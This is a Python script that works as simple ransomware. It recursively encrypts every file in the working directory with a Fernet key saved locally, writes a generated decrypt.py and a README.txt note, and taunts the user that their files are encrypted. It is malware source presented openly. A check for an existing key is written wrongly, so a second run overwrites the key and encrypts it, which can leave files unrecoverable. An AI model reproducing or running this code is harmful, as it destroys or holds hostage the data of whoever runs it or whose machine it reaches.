import os
from cryptography.fernet import Fernet

myFiles = []
isKey = False

for path, subdirs, files in os.walk("."):
    for name in files:
        strFile = str(os.path.join(path, name))
        if os.path.isfile(strFile):
            if strFile == "./encrypt.py" or strFile == "./decrypt.py":
                continue
            else:
                myFiles.append(strFile)

if "key.key" not in myFiles:
    key = Fernet.generate_key()
    with open("key.key", "wb") as encKey:
        encKey.write(key)
else:
    with open("key.key", "rb") as encKey:
        key = encKey.read()
    myFiles.remove("key.key")



for file in myFiles:
    with open(file, "rb") as fileData:
        data = fileData.read()
    encodedData = Fernet(key).encrypt(data)
    with open(file, "wb") as fileData:
        fileData.write(encodedData)
        
with open("decrypt.py", "w") as code:
    code.write(
'''
import os
from cryptography.fernet import Fernet
myFiles = []
with open("key.key", "rb") as encKey:
    key = encKey.read()


for path, subdirs, files in os.walk("."):
    for name in files:
        strFile = str(os.path.join(path, name))
        if os.path.isfile(strFile):
            if strFile == "./encrypt.py" or strFile == "./decrypt.py" or strFile == "./key.key" or strFile == "./README.txt":
                continue
            else:
                myFiles.append(strFile)
for file in myFiles:
    with open(file, "rb") as fileData:
        data = fileData.read()
    decodedData = Fernet(key).decrypt(data)
    with open(file, "wb") as fileData:
        fileData.write(decodedData)
os.remove("./key.key")
os.remove("./README.txt")
os.remove("./decrypt.py")
print("YOUR myFiles ARE READY FOR YOU SIR")
'''
    )

with open("README.txt", "w") as read:
    read.write(
'''

HELLO SO IF YOU WANT TO TAKE YOUR myFiles BACK JUST OPEN decrypt.py        
        
'''
    )

print("\n\n")
print("all your myFiles are encrypted hahaha")
print("NOW go and read README.txt")
